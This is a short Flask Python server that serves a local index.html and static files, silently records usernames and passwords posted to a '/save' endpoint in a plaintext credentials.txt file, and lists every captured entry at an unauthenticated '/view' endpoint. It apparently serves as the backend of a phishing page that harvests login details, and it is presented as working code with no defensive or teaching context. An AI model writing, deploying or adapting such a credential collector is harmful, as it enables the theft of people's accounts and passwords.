from flask import Flask, request, send_from_directory
import os

app = Flask(__name__)

# Serve index.html directly
@app.route('/')
def home():
    return send_from_directory('.', 'index.html')

# Serve static files (CSS, images)
@app.route('/<path:filename>')
def serve_file(filename):
    return send_from_directory('.', filename)

# Save credentials silently
@app.route('/save', methods=['POST'])
def save_credentials():
    data = request.get_json(silent=True) or {}
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()

    with open("credentials.txt", "a") as f:
        f.write(f"Username: {username}, Password: {password}\n")

    return ("", 204)

# View saved credentials
@app.route('/view')
def view_credentials():
    try:
        with open("credentials.txt", "r") as f:
            rows = f.readlines()
    except FileNotFoundError:
        rows = []
    return "<br>".join(rows)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)